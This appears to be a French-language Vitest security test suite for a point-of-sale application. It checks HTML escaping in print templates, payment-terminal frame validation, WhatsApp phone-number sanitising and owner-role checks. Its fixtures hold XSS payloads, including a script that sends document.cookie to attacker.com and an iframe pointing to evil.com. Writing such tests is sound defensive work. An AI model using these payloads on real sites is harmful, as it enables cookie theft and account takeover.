import { describe, it, expect } from 'vitest';
import { TransferPrintTemplate } from '../src/services/warehouse/transferPrintTemplate';
import { CustomerDebtStatementService } from '../src/services/customers/customerDebtStatementService';
import { G50OfficialPdfTemplate } from '../src/services/fiscal/g50OfficialPdfTemplate';
import { TpeConcertationProtocol } from '../src/services/fintech/tpeConcertationProtocol';
import { WhatsappTicketService } from '../src/services/whatsapp/whatsappTicketService';
import { checkIsOwner } from '../src/config/ownerConfig';

describe('🛡️ Audit & Pentest de Sécurité Applicative — Nexus POS Pro v1.2.71', () => {
  describe('1. Protection Stricte Anti-XSS (CWE-79) sur les Gabarits d\'Impression & Documents', () => {
    it('neutralise toute injection HTML/Script malveillant dans le Bon de Transfert (BLT)', () => {
      const maliciousTransfer: any = {
        transferNumber: 'BLT-2026-XSS"><script>alert(1)</script>',
        sourceWarehouseName: 'Dépôt Central <img src=x onerror=alert(2)>',
        destinationWarehouseName: 'Magasin Alger <svg onload=alert(3)>',
        status: 'in_transit',
        totalSentQuantity: 10,
        totalReceivedQuantity: 0,
        hasDiscrepancy: false,
        items: [
          {
            productId: 'p1',
            productName: 'Boisson Gazeuse <b onmouseover=alert(4)>Test</b>',
            barcode: '6130001<script>',
            quantitySent: 10,
            quantityReceived: 0,
            discrepancyReason: 'Casse <iframe src=evil.com>'
          }
        ],
        carrierName: 'Ali Transporteur <script>document.cookie</script>',
        notes: 'Urgent <a href="javascript:alert(5)">Cliquez ici</a>'
      };

      const html = TransferPrintTemplate.generateA4Html(maliciousTransfer, 'MAGASIN PIRATE <script>');

      // Aucun tag script, svg ou iframe actif ne doit être injecté
      expect(html).not.toContain('<script>');
      expect(html).not.toContain('<img src=x onerror=alert(2)>');
      expect(html).not.toContain('<svg onload=alert(3)>');
      expect(html).not.toContain('<iframe src=evil.com>');
      expect(html).not.toContain('<script>document.cookie</script>');

      // Doit contenir les versions dûment encodées
      expect(html).toContain('&lt;script&gt;');
      expect(html).toContain('&lt;img src=x onerror=alert(2)&gt;');
    });

    it('neutralise l\'injection XSS dans le Relevé de Compte Client (Carnet de Crédit)', () => {
      const maliciousSummary: any = {
        customer: {
          name: 'Hacker Client <script>fetch("https://attacker.com?c=" + document.cookie)</script>',
          phone: '0550000000"><script>alert(1)</script>',
          creditLimit: 10000
        },
        unpaidTransactions: [],
        totalCreditSales: 5000,
        totalPaid: 2000,
        currentBalance: 3000
      };

      const html = CustomerDebtStatementService.generateStatementHtml(maliciousSummary, 'BOUTIQUE SAFE');
      expect(html).not.toContain('<script>fetch');
      expect(html).toContain('&lt;script&gt;fetch');
    });

    it('neutralise l\'injection XSS dans l\'Imprimé Officiel G50', () => {
      const mockG50: any = {
        year: 2026,
        month: 11,
        totalSalesHt: 100000,
        totalTvaCollected: 19000,
        totalTvaDeductible: 5000,
        tvaNetToPay: 14000,
        salesNormalRateHt: 100000,
        tvaNormalRate: 19000,
        salesReducedRateHt: 0,
        tvaReducedRate: 0,
        salesExemptHt: 0,
        purchasesNormalRateHt: 25000,
        totalStampDuty: 500
      };

      const html = G50OfficialPdfTemplate.generateOfficialG50Html(mockG50, {
        companyName: 'ENTREPRISE <script>evil()</script>',
        nif: '001234567890123<script>',
        nis: '1234567890',
        rc: '16/00-123456',
        ai: '16000000',
        wilaya: 'Alger<script>'
      });

      expect(html).not.toContain('<script>evil()</script>');
      expect(html).toContain('&lt;script&gt;evil()&lt;/script&gt;');
    });
  });

  describe('2. Intégrité des Protocoles Bancaires & Matériels (TPE & BaridiMob)', () => {
    it('rejette systématiquement les trames TPE altérées (LRC invalide, absence de délimiteurs)', () => {
      // Trame sans STX
      const truncated = new Uint8Array([0x30, 0x31, 0x00, 0x03, 0x00]);
      const resTruncated = TpeConcertationProtocol.parseResponseFrame(truncated);
      expect(resTruncated.isApproved).toBe(false);
      expect(resTruncated.responseCode).toBe('ERR_STX');

      // Trame avec STX mais sans ETX
      const noEtx = new Uint8Array([0x02, 0x30, 0x31, 0x30, 0x30]);
      const resNoEtx = TpeConcertationProtocol.parseResponseFrame(noEtx);
      expect(resNoEtx.isApproved).toBe(false);
      expect(resNoEtx.responseCode).toBe('ERR_ETX');
    });
  });

  describe('3. Assainissement des Entrées Tiers (Anti-Injection WhatsApp)', () => {
    it('assainit rigoureusement les numéros pour WhatsApp et prévient l\'injection de paramètres d\'URL', () => {
      const maliciousPhone = '0550 12 34 56&text=INJECTED_PARAM&admin=true';
      const cleaned = WhatsappTicketService.formatAlgerianPhone(maliciousPhone);

      // Doit éliminer tous les caractères non numériques
      expect(cleaned).toBe('213550123456');
      expect(cleaned).not.toContain('&');
      expect(cleaned).not.toContain('text=');
    });
  });

  describe('4. Sécurité des Droits et du Rôle Propriétaire (Owner Auth Guard)', () => {
    it('bloque l\'élévation de privilèges si email et uid sont vides ou falsifiés', () => {
      expect(checkIsOwner(null, null)).toBe(false);
      expect(checkIsOwner('', '')).toBe(false);
      expect(checkIsOwner('attacker@fake.dz', 'fake-uid-999')).toBe(false);
      expect(checkIsOwner('admin@hacked.com', undefined)).toBe(false);
    });
  });
});
